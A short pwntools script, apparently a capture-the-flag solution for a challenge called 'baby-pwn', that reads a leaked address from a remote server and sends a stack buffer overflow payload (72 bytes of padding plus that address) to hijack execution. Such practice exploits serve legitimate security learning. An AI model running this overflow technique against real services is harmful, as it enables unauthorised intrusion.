from pwn import *

elf = ELF("baby-pwn")

r = elf.process()

#gdb.attach(r, """
#           break main
#           """)

r = remote("34.162.142.123", 5000)
ret = r.recv().decode("utf-8")
print(ret)
secret = ret.split('\n')[1].split(': ')[1]
secret = int(secret,16)
print(hex(secret))
payload = b'a'*72+p64(secret)
r.sendline(payload)
print(r.recv())
print(r.recv())
print(r.recv())
